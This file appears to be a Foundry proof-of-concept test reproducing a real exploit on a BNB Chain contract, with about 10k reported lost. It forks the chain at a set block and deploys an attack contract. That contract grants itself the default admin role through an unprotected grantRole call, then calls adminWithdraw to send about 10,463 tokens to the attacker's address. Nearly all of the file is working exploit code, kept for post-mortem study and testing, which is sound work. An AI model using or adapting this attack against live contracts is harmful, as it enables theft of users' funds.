pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 10k
// Attacker : https://bscscan.com/address/0x847705eeb01b4f2ae9a92be12615c1052f52e7ad
// Attack Contract : https://bscscan.com/address/0xa2d1e47e1a154dd51f2eae0413100c4f8abe13c7, https://bscscan.com/address/0xd0a60158b6a5ef01cee3ba9652df695671f366e3
// Vulnerable Contract : https://bscscan.com/address/0x8de7eaba58efb23b6f323984377af582b23134e9
// Attack Tx : https://bscscan.com/tx/0x56d3ed5f635b009e19d693e432479323b23b3eb368cf04e161adbc672a15898e

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1828983569278231038
// Twitter Guy : https://x.com/TenArmorAlert/status/1828983569278231038
// Hacking God : N/A

address constant addr1 = 0x603dd1d86b9bC3Ba7aB5c0267eaf7293Ca2abc52;
address constant header_addr = 0x667DFEd3C4D56DF32Ecc3F2E3CE5BcC4ef03A6Dc;
address constant vul_addr = 0x8DE7EAbA58EfB23B6F323984377af582B23134e9;
address constant attacker = 0x847705EEB01b4f2Ae9a92BE12615C1052F52e7Ad;
address constant dai = 0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3;


contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 41770501);
    }
    
    function testPoC() public {
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(dai).balanceOf(address(attacker)), 18);
    }
}

// 0xA2d1e47e1A154dD51f2eae0413100c4F8ABE13C7
contract AttackerC {
    constructor() {
        // vul_addr.grantRole(bytes32 role, address account)
        (bool s1,) = vul_addr.call(
            abi.encodeWithSelector(
                bytes4(keccak256("grantRole(bytes32,address)")),
                bytes32(0),
                address(this)
            )
        );
        require(s1, "grantRole failed");

        // vul_addr.adminWithdraw(address handlerAddress, address tokenAddress, address recipient, uint256 amountOrTokenID)
        (bool s2,) = vul_addr.call(
            abi.encodeWithSelector(
                bytes4(keccak256("adminWithdraw(address,address,address,uint256)")),
                header_addr,
                dai,
                attacker,
                uint256(10463638549999999999999)
            )
        );
        require(s2, "adminWithdraw failed");
    }
}